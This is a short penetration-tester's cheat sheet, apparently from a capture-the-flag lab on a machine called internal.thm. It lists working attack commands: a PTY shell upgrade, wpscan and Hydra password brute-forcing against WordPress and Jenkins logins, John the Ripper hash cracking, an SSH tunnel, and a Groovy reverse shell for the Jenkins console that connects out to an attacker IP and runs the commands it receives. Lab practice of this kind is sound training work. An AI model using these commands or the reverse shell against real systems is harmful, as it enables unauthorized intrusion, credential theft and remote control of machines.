### PYTHON BEAUTIFUL SHELL:
- python -c 'import pty; pty.spawn("/bin/bash")'

### WPSCAN
- wpscan --url http://internal.thm/blog/ --usernames admin --passwords /home/phulelouch/Downloads/SecLists/Passwords/darkweb2017-top10000.txt

### SSH TUNNLING
If you have SSH access to the machine running Jenkins, you could create an SSH tunnel. This will allow you to access the service as if you were on the same network. Here's an example command:
- ssh -L <your_machine_port>:<ip_you_want_to_access>:<port_want_to_access> user@host
- ssh -L 8080:172.17.0.2:8080 aubreanna:@10.10.107.36

### HYDRA
- Hydra http-post-form: hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 16 -s 8080 localhost http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Error" -vV -f

### JOHN THE RIPPER
- For phpmyadmin: john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

### Groovy

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.50.72/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

